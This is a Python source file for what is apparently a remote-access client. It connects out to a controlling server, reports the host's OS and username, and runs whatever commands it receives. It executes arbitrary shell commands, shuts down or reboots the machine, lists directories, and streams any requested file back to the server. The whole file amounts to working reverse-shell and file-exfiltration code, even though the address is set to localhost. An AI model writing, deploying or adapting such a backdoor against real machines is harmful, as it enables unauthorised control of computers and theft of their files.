import socket
import os
import platform


BUFFER_SIZE = 4096
SYSTEM_TYPE = platform.system()
SYSTEM_NAME = os.popen("whoami").read().strip("\n")
PORT = 8091
IP = "127.0.0.1"  # TODO: give IP and PORT parameters out of the code
BREAK = "<BREAK>"
power_commands = {"shutdown": {"Windows": "shutdown /s /t 000",
                               "Linux": "shutdown now"},
                  "restart": {"Windows": "shutdown /r",
                              "Linux": "reboot"},
                  "log_out": {"Windows": "shutdown /l",
                              "Linux": "gnome-session-quit --no-prompt"}}


def send_response(client_socket, msg_type, msg):
    # TODO: split long commands to many packets
    path = os.getcwd()

    if msg_type == "filepart":
        response = msg
        resp_len = str(len(response)).zfill(8).encode()
        resp = resp_len + response
        client_socket.send(resp)

    else:
        if msg_type == "sys_info":
            response = f"{msg_type} {msg}"
        elif msg_type == "file":
            response = f"{msg_type} {msg}"
        elif msg_type == "files_list":
            response = f"{msg_type} {msg}"
        else:
            response = f"{msg_type} {path} {msg}"
        resp_len = str(len(response.encode())).zfill(8)
        resp = resp_len + response
        client_socket.send(resp.encode())


def handle_server_response(command, client_socket):
    cmd_type = command.split()[0]
    cmd = " ".join(command.split()[1:])

    # TODO: add windows support - DONE
    if cmd_type == "power":
        try:
            print(f"cmd: {cmd}, system_type: {SYSTEM_TYPE}")
            power_command = power_commands[cmd][SYSTEM_TYPE]
            os.system(power_command)
        except KeyError:
            return "power", "KeyError"
        return "power", "done"

    elif cmd_type == "execute":
        if cmd.split()[0] == "cd":
            try:
                os.chdir(cmd.split()[1])
                output = os.getcwd()
            except FileNotFoundError:
                output = "No such file or directory!"
            except IndexError:
                os.chdir(os.path.expanduser("~"))
                output = os.getcwd()
        else:
            try:
                output = os.popen(cmd).read()
            except UnicodeDecodeError:
                output = "Unreadable response!"
        return "execute", output

    elif cmd_type == "file":
        file_name = cmd
        try:
            file_size = os.path.getsize(file_name)
            send_response(client_socket, "file", f"{file_name}{BREAK}{file_size}")

            with open(file_name, "rb") as file:
                while True:
                    bytes_read = file.read(BUFFER_SIZE)
                    if len(bytes_read) == 0:
                        break
                    send_response(client_socket, "filepart", bytes_read)
            print("done")
            return "file", "done"
        except FileNotFoundError:
            print("file not found")
            return "file", "FileNotFound"

    elif cmd_type == "files_list":
        files_location = cmd
        files_list = os.listdir(files_location)
        print(f"files_list: {files_list}")
        counter = 0
        for file in files_list:
            if os.path.isdir(f"{files_location}{file}"):
                files_list[counter] = f"DIR {files_list[counter]}"
            else:
                files_list[counter] = f"FILE {files_list[counter]}"
            counter += 1

        files = BREAK.join(files_list)
        print(f"files: {files}")
        return "files_list", files
    return "exit", 0


def send_basic_info(client_socket):
    send_response(client_socket, "sys_info", f"os {SYSTEM_TYPE}")
    send_response(client_socket, "sys_info", f"name {SYSTEM_NAME}")


def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((IP, PORT))
    print("Client connected")

    send_basic_info(client_socket)
    os.chdir("/")
    command = ""
    while command != "exit 0":
        command = client_socket.recv(1024).decode()
        if len(command.split()) >= 2:
            cmd_type, cmd = handle_server_response(command, client_socket)
        else:
            cmd_type = "Error"
            cmd = "Wrong format"
        send_response(client_socket, cmd_type, cmd)

    client_socket.close()


if __name__ == "__main__":
    main()
